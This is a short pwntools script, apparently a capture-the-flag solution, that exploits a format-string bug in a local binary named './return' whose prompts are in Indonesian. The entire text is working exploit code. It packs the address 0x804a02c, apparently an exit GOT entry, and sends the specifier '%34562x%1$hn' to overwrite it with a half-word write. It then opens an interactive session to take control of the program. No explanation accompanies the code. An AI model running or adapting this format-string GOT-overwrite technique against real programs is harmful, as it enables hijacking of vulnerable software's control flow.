from pwn import *

r = process("./return")
exit = p32(0x804a02c)
target = "%34562x" + "%1$hn"
r.sendline("4")
payload = exit + target
r.sendline(payload)
r.recvuntil("yang kamu jual : ")
r.recvrepeat(1)
r.interactive()

